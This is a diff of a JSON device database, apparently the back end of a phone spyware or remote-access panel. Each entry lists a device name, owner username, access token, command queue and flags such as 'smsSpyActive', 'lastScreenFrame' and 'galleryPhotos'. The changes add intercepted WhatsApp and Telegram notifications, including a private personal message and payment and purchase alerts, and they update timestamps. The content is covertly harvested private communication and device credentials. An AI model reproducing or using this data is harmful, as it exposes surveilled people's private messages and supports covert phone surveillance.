@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776771649902,
+    "lastSeen": 1776771664494,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776771649369,
+    "lastSeen": 1776771664079,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776771649349,
+    "lastSeen": 1776771664061,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Ara na Zakiii💕🫶💖💌💋",
+        "content": "bagi waktu gimana muh apanya yg aku bagi waktu ama cwo lain",
+        "time": "21/04 18:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776771664986
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Fastcal haikk",
+        "content": "💳 NEW DEPOSIT RECEIVED!\n━━━━━━━━━━━━━━━\n👤 Sender: NOBU / SE******\n🏦 Method: DANA\n💰 Amount: Rp 2.000\n💸 Fee: Rp 203\n💵 Total Payload: Rp 2.203\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO20260421193758241367\n🏷️ System ID: FSCL41937618\n⏰ 21 Apr 2026 • 18:39 WIB\n\n#DEPOSIT #DANA",
+        "time": "21/04 18:40",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776771650912
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
+        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: TikTok/Douyin\n• Negara: Canada 🇨🇦\n• Server: Server (4)\n• Nomor: +1365*****32\n• Waktu: 21/04/2026, 18.34",
+        "time": "21/04 18:40",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776771650771
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Fastcal Shop Nokos Monitor Harga",
+        "content": "📈 UPDATE HARGA TELEGRAM\n\n📍 Negara: Indonesia\n🕐 Waktu: 21/4/2026, 18.35.14\n📊 Total Server: 75\n📦 Stok Total: 3725\n\n━━━━━━━━━━━━━━━━━━━\n\n🔴 HARGA NAIK!\n\nServer 6\n💰 Rp 3.800 → Rp 4.700\n📈 Naik Rp 900 (23.7%)\n📊 Rate: 100% | 📦 Stok: 1\n\nServer 47\n💰 Rp 2.750 → Rp 3.550\n📈 Naik Rp 800 (29.1%)\n📊 Rate: 100% | 📦 Stok: 26\n\nServer 48\n💰 Rp 2.700 → Rp 3.900\n📈 Naik Rp 1.200 (44.4%)\n📊 Rate: 100% | 📦 Stok: 26\n\nServer 49\n💰 Rp 2.700 → Rp 3.950\n📈 Naik Rp 1.250 (46.3%)\n📊 Rate: 100% | 📦 Stok: 26\n\nServer 50\n💰 Rp 2.700 → Rp 3.950\n📈 Naik Rp 1.250 (46.3%)\n📊 Rate: 100% | 📦 Stok: 27\n\nServer 51\n💰 Rp 2.650 → Rp 3.950\n📈 Naik Rp 1.300 (49.1%)\n📊 Rate: 100% | 📦 Stok: 35\n\nServer 52\n💰 Rp 2.650 → Rp 4.000\n📈 Naik Rp 1.350 (50.9%)\n📊 Rate: 100% | 📦 Stok: 36\n\nServer 53\n💰 Rp 2.650 → Rp 4.000\n📈 Naik Rp 1.350 (50.9%)\n📊 Rate: 100% | 📦 Stok: 36\n\nServer 54\n💰 Rp 2.650 → Rp 4.050\n📈 Naik Rp 1.400 (52.8%)\n📊 Rate: 100% | 📦 Stok: 36\n\nServer 55\n💰 Rp 2.600 → Rp 4.550\n📈 Naik Rp 1.950 (75%)\n📊 Rate: 100% | 📦 Stok: 39\n\nServer ",
+        "time": "21/04 18:40",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776771650754
+      },
+      {
+        "appName": "Telegram",
+        "sender": "GB CPANEL BY PRABOWO: Donzx Store",
+        "content": "Eh kalo dah pasang file badak tinggal pake apa harus nunggu",
+        "time": "21/04 18:40",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776771650735
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -14362,46 +14402,6 @@
         "time": "21/04 18:02",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776769359502
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 18:02",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769359418
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16959 pesan baru dari 115 obrolan",
-        "time": "21/04 18:02",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769359373
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 18:02",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769358495
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 18:02",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769358481
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 18:02",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769358374
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776771647751,
+    "lastSeen": 1776771662666,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
